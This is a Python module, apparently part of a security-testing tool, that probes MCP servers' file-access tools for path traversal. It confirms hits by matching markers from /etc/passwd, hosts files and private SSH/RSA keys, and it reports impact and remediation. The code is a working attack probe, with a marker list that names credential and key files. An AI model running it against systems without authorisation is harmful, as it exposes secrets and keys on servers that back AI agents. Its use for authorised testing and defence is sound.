"""
Path Traversal / LFI against MCP file-access tools.

Probes tools that look like file-readers with payloads aimed at files
that almost always exist on a Linux/Windows host (/etc/passwd, hosts
file, proc self env). Confirmation = the response text contains the
file's canonical markers (`root:x:0:0:`, `127.0.0.1`, etc.).

Also probes `file://` scheme via URL-accepting tools when applicable.
"""


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "path_traversal"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    only_tool_names = params.get("only_tool_names") or []

    mcp = mcp_client.MCPClient.from_target(target, timeout=timeout)
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            errs = disc.get("errors") or []
            detail = errs[0] if errs else {}
            init_resp = (disc.get("raw") or {}).get("initialize") or {}
            rb.error(
                f"MCP initialize failed. step={detail.get('step','init')} "
                f"status={init_resp.get('status')} "
                f"transport={init_resp.get('transport')} "
                f"error={detail.get('error') or init_resp.get('error')} "
                f"target_base_url={target.get('base_url')}")
            rb.add_evidence(evidence.ev_mcp_call(
                init_resp, note="failed initialize"))
            return rb.finalize(success=False)
        tools = disc.get("tools") or []
        cands = _pick_file_tools(tools, only_tool_names)
        if not cands:
            rb.warn("No file-access tools. Set only_tool_names to force.")
            return rb.finalize(success=True)
        rb.info(f"Candidate file-access tools: {[t.get('name') for t in cands]}")

        traversal_payloads = payloads.get("path_traversal") or []
        if not traversal_payloads:
            rb.warn("No path_traversal payloads in library.")
            return rb.finalize(success=False)

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            str_params = [n for n, s in (schema.get("properties") or {}).items()
                          if isinstance(s, dict) and s.get("type") == "string"]
            if not str_params:
                continue
            for pname in str_params:
                # Pick the single best-candidate parameter names first
                if not _looks_like_path_param(pname):
                    continue
                for p in traversal_payloads:
                    args = _fill_defaults(schema)
                    args[pname] = p["content"]
                    r = mcp.call_tool_safe(tname, args)
                    text = r.get("text_output") or ""
                    match = _match_marker(text)
                    if match:
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "path_traversal"),
                            title=f"Path traversal CONFIRMED on '{tname}' / '{pname}'",
                            category="path_traversal",
                            severity="high",
                            confidence="confirmed",
                            cwe="CWE-22",
                            tool=tname, parameter=pname, payload=p["content"],
                            description=(
                                f"Requesting '{p['content']}' returned content "
                                f"matching the canonical marker `{match}`. The "
                                "tool reads arbitrary paths outside its intended "
                                "sandbox."
                            ),
                            impact=(
                                "Attacker can read any file the MCP process has "
                                "access to: application source, secrets in /etc, "
                                "K8s service-account tokens, SSH keys. Combined "
                                "with a write primitive, this often yields RCE."
                            ),
                            remediation=(
                                "Resolve the input to an absolute canonical path "
                                "with realpath() and reject if it does not start "
                                "with the allowed base directory. Strip `..`, "
                                "null bytes, URL-decoded payloads, and any "
                                "scheme prefixes."
                            ),
                            references=["https://cwe.mitre.org/data/definitions/22.html"],
                            evidence=[evidence.ev_mcp_call(r)],
                        ))
                        break
        return rb.finalize()
    finally:
        mcp.close()


_FILE_KEYWORDS = ("read_file", "readfile", "file", "path", "document", "doc",
                  "open", "load", "fetch_file", "cat", "get_file")
_PATH_PARAM_HINTS = ("path", "file", "filename", "document", "uri", "url",
                     "target", "location")


def _pick_file_tools(tools, force):
    if force:
        return [t for t in tools if t.get("name") in set(force)]
    out = []
    for t in tools:
        blob = f"{t.get('name','')} {t.get('description','')}".lower()
        if any(k in blob for k in _FILE_KEYWORDS):
            out.append(t)
    return out


def _looks_like_path_param(name):
    n = name.lower()
    return any(h in n for h in _PATH_PARAM_HINTS)


_MARKERS = [
    ("root:x:0:0:",        "Linux /etc/passwd"),
    ("root:*:0:0:",        "BSD /etc/passwd"),
    ("daemon:",            "generic /etc/passwd line"),
    ("127.0.0.1",          "/etc/hosts loopback"),
    ("localhost",          "/etc/hosts localhost"),
    ("Microsoft Corp",     "Windows hosts header"),
    ("[boot loader]",      "Windows boot.ini"),
    ("BEGIN OPENSSH PRIVATE KEY", "SSH key"),
    ("-----BEGIN RSA PRIVATE KEY-----", "RSA private key"),
]


def _match_marker(text):
    if not text:
        return None
    for m, label in _MARKERS:
        if m in text:
            return label
    return None


def _fill_defaults(schema):
    out = {}
    props = (schema or {}).get("properties") or {}
    for n in ((schema or {}).get("required") or []):
        t = ((props.get(n) or {}).get("type"))
        out[n] = {"string": ".", "integer": 1, "number": 1,
                  "boolean": False, "array": [], "object": {}}.get(t, "")
    return out
